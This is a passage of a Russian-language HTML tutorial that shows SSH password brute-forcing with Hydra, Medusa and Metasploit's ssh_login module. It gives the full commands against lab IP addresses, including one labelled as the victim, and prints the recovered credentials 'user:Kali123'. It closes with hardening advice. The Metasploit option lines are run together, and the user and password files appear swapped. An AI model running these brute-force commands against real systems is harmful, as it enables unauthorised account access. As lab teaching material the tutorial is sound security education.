+			<p id="131aa64c-9d0a-81b9-8fcd-e5e727d4e9ec" class="">Для подбора пароля с помощью Hydra используется
+				команда: </p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8163-8125-dd89a8f54cbe"
+				class="code"><code class="language-Bash">hydra -V -f -t 4 -1 test -Р /root/wordlist ssh://111.11.11.11</code></pre>
+			<table id="131aa64c-9d0a-819b-bc6c-d646c4424a60" class="simple-table">
+				<tbody>
+					<tr id="131aa64c-9d0a-8149-ba97-c66c1a81fef1">
+						<td id="=IQq" class=""><strong>Параметр</strong></td>
+						<td id="=BC]" class=""><strong>Значение</strong></td>
+					</tr>
+					<tr id="131aa64c-9d0a-812d-ae12-f735cfd46ff9">
+						<td id="=IQq" class=""><code><strong>-V</strong></code></td>
+						<td id="=BC]" class="">показывать пару логин + пароль во время перебора</td>
+					</tr>
+					<tr id="131aa64c-9d0a-814c-b8ae-f8df15f18075">
+						<td id="=IQq" class=""><code><strong>-f</strong></code></td>
+						<td id="=BC]" class="">остановка, как только будет найден пароль для указаного логина</td>
+					</tr>
+					<tr id="131aa64c-9d0a-8162-92e3-fa4bee41ab51">
+						<td id="=IQq" class=""><code><strong>-Р</strong></code></td>
+						<td id="=BC]" class="">путь до словаря с паролями</td>
+					</tr>
+					<tr id="131aa64c-9d0a-8132-b3f2-dea702e5a40c">
+						<td id="=IQq" class=""><code><strong>ssh://111.11.11.11</strong></code></td>
+						<td id="=BC]" class="">IР-адрес жертвы</td>
+					</tr>
+				</tbody>
+			</table>
+			<h2 id="131aa64c-9d0a-814a-a85a-da5764ab2ddb" class=""><strong>Практика</strong></h2>
+			<p id="131aa64c-9d0a-818d-87a3-fa9ca9f5fc0c" class="">В нашем случае воспользуемся командой: </p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-812c-9f37-dac42d689841"
+				class="code"><code class="language-Bash">hydra -V -f -t 4 -l user -P /home/user/passwords.txt ssh://192.168.79.144</code></pre>
+			<figure id="131aa64c-9d0a-817a-80b4-c3b1697b2848" class="image"><a
+					href="https://i.imgur.com/oH6d5rA.png"><img src="https://i.imgur.com/oH6d5rA.png" /></a></figure>
+			<p id="131aa64c-9d0a-810d-9b85-f5ba54457fad" class="">Пароль успешно подобран.</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8172-b872-f33a620f99df"
+				class="code"><code class="language-Bash">[22][ssh] host: 192.168.79.144 login: user password: Kali123</code></pre>
+			<h1 id="131aa64c-9d0a-810b-80de-fbe5a08dbbd5" class=""><strong>3. Medusa</strong></h1>
+			<p id="131aa64c-9d0a-813a-9d4b-e81ec4bf5cd2" class="">Для подбора пароля с помощью Medusa используется
+				команда: </p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-818a-b51b-e1d2f31a27a3"
+				class="code"><code class="language-Bash">medusa -h 192.168.60.50 -u test -Р /root/wordlist -М ssh -f -v 6</code></pre>
+			<table id="131aa64c-9d0a-81b1-b43f-e9146bd1dfe6" class="simple-table">
+				<tbody>
+					<tr id="131aa64c-9d0a-81b2-9d55-fb69d53d2ce4">
+						<td id="]OPN" class=""><strong>Параметр</strong></td>
+						<td id="=^{e" class=""><strong>Значение</strong></td>
+					</tr>
+					<tr id="131aa64c-9d0a-81cc-bf03-fd9156fd1207">
+						<td id="]OPN" class=""><code><strong>-h</strong></code></td>
+						<td id="=^{e" class="">IР-адрес жертвы</td>
+					</tr>
+					<tr id="131aa64c-9d0a-8146-9069-edffb33cb5f0">
+						<td id="]OPN" class=""><code><strong>-u</strong></code></td>
+						<td id="=^{e" class="">Логин</td>
+					</tr>
+					<tr id="131aa64c-9d0a-8195-844c-f8110d95bf0f">
+						<td id="]OPN" class=""><code><strong>-Р</strong></code></td>
+						<td id="=^{e" class="">Путь к словарю</td>
+					</tr>
+					<tr id="131aa64c-9d0a-8102-8ac5-e905a360a891">
+						<td id="]OPN" class=""><code><strong>-М</strong></code></td>
+						<td id="=^{e" class="">Выбор модуля</td>
+					</tr>
+					<tr id="131aa64c-9d0a-812f-95ac-de9bc7cb14ad">
+						<td id="]OPN" class=""><code><strong>-f</strong></code></td>
+						<td id="=^{e" class="">Остановка после нахождения валидной пары логин/пароль</td>
+					</tr>
+					<tr id="131aa64c-9d0a-81bf-a132-f057caf3ea13">
+						<td id="]OPN" class=""><code><strong>-v</strong></code></td>
+						<td id="=^{e" class="">Настройка отображения сообщений на экране во время процесса подбора</td>
+					</tr>
+				</tbody>
+			</table>
+			<h2 id="131aa64c-9d0a-81de-87eb-c3252408fa95" class=""><strong>Практика</strong></h2>
+			<p id="131aa64c-9d0a-81d8-9e9f-de9c9dceda52" class="">В нашем случае воспользуемся командой:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8143-8399-daa2d4eb41b4"
+				class="code"><code class="language-Bash" style=" word-break:break-all">medusa -h 192.168.79.144 -u user -P passwords.txt -M ssh -f -v 6</code></pre>
+			<figure id="131aa64c-9d0a-81ba-ab56-d699b499b769" class="image"><a
+					href="https://i.imgur.com/8LRvRQg.png"><img src="https://i.imgur.com/8LRvRQg.png" /></a></figure>
+			<p id="131aa64c-9d0a-8170-99a1-e8b737e59dce" class="">Пароль успешно подобран.</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81cb-9698-e265b259bc88"
+				class="code"><code class="language-Bash" style=" word-break:break-all">ACCOUNT FOUND: [ssh] Host: 192.168.79.144 User: user Password: Kali123 [SUCCESS]</code></pre>
+			<h1 id="131aa64c-9d0a-816e-8d2e-f854c23bef0d" class=""><strong>4. Metasploit</strong></h1>
+			<h2 id="131aa64c-9d0a-8165-8ff4-ffd98ff08034" class="">4.1 Запустим metasploit: <code>msfconsole</code></h2>
+			<figure id="131aa64c-9d0a-8128-ba6b-f6f611b14a8b" class="image"><a
+					href="https://i.imgur.com/CzGmZ5i.png"><img style="width:576px"
+						src="https://i.imgur.com/CzGmZ5i.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-81f1-a62e-d64c1033baf4" class="">4.2 Найдем нужный
+				инструмент: <code>search ssh_login</code></h2>
+			<figure id="131aa64c-9d0a-819b-8ce5-e07ea9c94d66" class="image"><a
+					href="https://i.imgur.com/GSPRPnb.png"><img style="width:624px"
+						src="https://i.imgur.com/GSPRPnb.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-81c5-bb21-e56d36acbe48" class="">4.3 Первый обеспечивает подбор логина и пароля, а
+				второй - логина и публичного ключа. </h2>
+			<p id="131aa64c-9d0a-813f-9aef-e8774023f45a" class="">Нас сейчас интересует первый модуль: </p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8187-bd01-e9095785aac6"
+				class="code"><code class="language-Bash">use auxiliary/scanner /ssh /ssh_login</code></pre>
+			<figure id="131aa64c-9d0a-8169-9cd1-fba42f28c22b" class="image"><a
+					href="https://i.imgur.com/j2fEk9l.png"><img style="width:624px"
+						src="https://i.imgur.com/j2fEk9l.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-81a9-b2a3-c5f0d603aeda" class="">4.4 Посмотрим необходимые параметры для заполнения: 
+			</h2>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-817d-a768-d7673b749165"
+				class="code"><code class="language-Bash">show options</code></pre>
+			<figure id="131aa64c-9d0a-81e0-b17e-cd557fead110" class="image"><a
+					href="https://i.imgur.com/vsqTGSM.png"><img style="width:624px"
+						src="https://i.imgur.com/vsqTGSM.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-81f2-97f9-cffa334bf9da" class="">4.5 Заполним их нужными данными (каждый отдельной
+				строкой)</h2>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81e3-a46b-ce06440917b0"
+				class="code"><code class="language-Bash">set blank_passwords trueset stop_on_success trueset verbose trueset user_file password.txtset pass_file user_name.txtset rhosts 192.168.79.144</code></pre>
+			<figure id="131aa64c-9d0a-81d2-8b0e-f2eb436d7fc8" class="image"><a
+					href="https://i.imgur.com/HwniQQR.png"><img style="width:624px"
+						src="https://i.imgur.com/HwniQQR.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-81c5-afdd-c0729f7c7617" class="">4.6 Запустим с помощью
+				команды <code>use</code> или <code>exploit</code></h2>
+			<figure id="131aa64c-9d0a-81cb-bfbb-d7ba8a1725de" class="image"><a
+					href="https://i.imgur.com/c9AGKRM.png"><img style="width:576px"
+						src="https://i.imgur.com/c9AGKRM.png" /></a></figure>
+			<p id="131aa64c-9d0a-81a8-9d36-d87cbc71d5fa" class="">Результат:</p>
+			<figure id="131aa64c-9d0a-8130-bc6b-fc886666cc69" class="image"><a
+					href="https://i.imgur.com/fRvc2TN.png"><img style="width:624px"
+						src="https://i.imgur.com/fRvc2TN.png" /></a></figure>
+			<p id="131aa64c-9d0a-8144-973b-cf5e5fb4f55b" class="">Пароль успешно подобран.</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81b1-9578-ff46b2f82fa2"
+				class="code"><code class="language-Bash">[+] 192.168.79.144:22 - Success: &#x27;user:Kali123&#x27; &#x27;uid=1000(user) gid=1000(user) группы=1000(user), 4(adm), 20(dialout), 24(cdrom), 25(floppy), 27(sudo), 29(audio), 30(dip), 44(video), 46(plugdev), 109(netdev), 119(wireshark), 121(bluetooth), 137(scanner), 141(kaboxer) Linux kali 5.18.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07) x86_64 GNU/Linux &#x27;</code></pre>
+			<h1 id="131aa64c-9d0a-8168-96a3-cafd605c670d" class=""><strong>Вывод</strong></h1>
+			<p id="131aa64c-9d0a-812b-a02b-c293ee5fe67c" class="">Подобрать пароль можно всегда, так что для своей же
+				безопасности нужно ставить сложные пароли, менять порт ssh, не разрешать доступ от root.</p>
+			<p id="131aa64c-9d0a-81be-84af-d3fbf538bbe5" class="">
+			</p>
+		</div>
+	</article><span class="sans" style="font-size:14px;padding-top:2em"></span>
+</body>
+
+</html>
